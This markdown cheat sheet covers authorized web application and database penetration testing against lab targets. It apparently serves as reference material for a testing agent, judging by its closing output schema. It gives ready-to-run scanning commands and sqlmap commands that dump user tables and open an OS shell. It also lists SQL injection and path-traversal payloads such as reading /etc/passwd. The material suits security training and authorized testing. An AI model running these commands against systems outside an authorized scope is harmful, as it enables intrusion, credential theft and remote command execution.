# Web application & database testing

Authorized web app pentest and SQL injection workflows for lab targets (`lab-app.local`, `10.77.0.50`).

---

## Proxy workflow

1. **Burp Suite** or **ZAP** — intercept browser
2. Spider / crawl scoped to target
3. Active scan or manual repeater
4. Export findings → report

```bash
# ZAP daemon quick scan
zaproxy -daemon -port 8080 -config api.disablekey=true
zap-cli quick-scan --self-contained https://lab-app.local/
```

---

## Content discovery

```bash
# ffuf directory
ffuf -u https://lab-app.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403

# vhost fuzz
ffuf -u https://lab-app.local/ -H "Host: FUZZ.lab-app.local" -w vhosts.txt

# Gobuster
gobuster dir -u https://lab-app.local/ -w /usr/share/wordlists/dirb/big.txt -k

# Feroxbuster recursive
feroxbuster -u https://lab-app.local/ -w wordlist.txt -d 2

# Arjun parameters
arjun -u https://lab-app.local/api/search
```

---

## Vulnerability scanning

```bash
nikto -h https://lab-app.local/
nuclei -u https://lab-app.local/ -t /root/nuclei-templates/http/cves/
wpscan --url https://lab-wp.local/ --enumerate vp,vt,u
```

---

## sqlmap (deep)

```bash
# Basic GET
sqlmap -u "http://lab-app.local/item?id=1" --batch

# POST from Burp request file
sqlmap -r request.txt --batch

# DB enum
sqlmap -u "http://lab-app.local/item?id=1" --dbs
sqlmap -u "http://lab-app.local/item?id=1" -D appdb --tables
sqlmap -u "http://lab-app.local/item?id=1" -D appdb -T users --dump

# OS shell (lab only, ROE)
sqlmap -u "http://lab-app.local/item?id=1" --os-shell

# MSSQL / Oracle / PostgreSQL
sqlmap -u "..." --dbms=mssql
```

---

## Manual testing checklist

| Test | Tool / method |
|------|----------------|
| SQLi | sqlmap, manual `' OR 1=1--` |
| XSS | reflected/stored/DOM — browser + XSSer |
| CSRF | token absence on state change |
| SSRF | internal URL in params |
| LFI | `../../../../etc/passwd` |
| RCE | commix, upload bypass |
| Auth | default creds, JWT attacks (`jwt_tool`) |
| IDOR | swap object IDs |
| XXE | XML endpoints |
| Deserialization | Java/.NET/Python gadgets |

---

## CMS-specific

```bash
wpscan --url https://lab-wp.local/ -e ap,at,cb,dbe
joomscan -u https://lab-joomla.local/
droopescan scan drupal -u https://lab-drupal.local/
```

---

## API testing

```bash
# OpenAPI diff
curl -s https://lab-app.local/openapi.json | jq .

# GraphQL introspection (if enabled)
curl -X POST https://lab-app.local/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

---

## Database direct (lab creds)

```bash
# MySQL
mysql -h 10.77.0.20 -u app -p -e "SHOW DATABASES;"

# PostgreSQL
psql -h 10.77.0.20 -U app -c "\dt"

# MSSQL (impacket)
impacket-mssqlclient LAB/app:Pass@10.77.0.20
```

---

## Agent output schema

```json
{
  "target": "https://lab-app.local/",
  "findings": [
    {"id": "SQLi-001", "severity": "high", "url": "/item?id=1", "tool": "sqlmap", "evidence": "DBMS: MySQL"}
  ],
  "tools_run": ["ffuf", "nikto", "sqlmap"]
}
```